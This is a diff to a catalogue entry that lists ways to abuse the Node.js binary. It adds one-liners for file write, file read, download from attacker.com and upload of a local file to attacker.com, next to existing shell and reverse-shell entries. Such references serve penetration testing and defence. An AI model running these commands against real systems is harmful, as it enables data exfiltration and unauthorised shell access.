@@ -3,6 +3,22 @@ functions:
   shell:
     - code: |
         node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
+  file-write:
+    - code: node -e 'fs.writeFileSync("file_to_write", "DATA")'
+  file-read:
+    - code: node -e 'process.stdout.write(fs.readFileSync("/bin/ls"))'
+  file-download:
+    - description: Fetch a remote file via HTTP GET request.
+      code: |
+        export URL=http://attacker.com/file_to_get
+        export LFILE=file_to_save
+        node -e 'http.get(process.env.URL, res => res.pipe(fs.createWriteStream(process.env.LFILE)))'
+  file-upload:
+    - description: Send a local file via HTTP POST request.
+      code: |
+        export URL=http://attacker.com
+        export LFILE=file_to_send
+        node -e 'fs.createReadStream(process.env.LFILE).pipe(http.request(process.env.URL))'
   reverse-shell:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
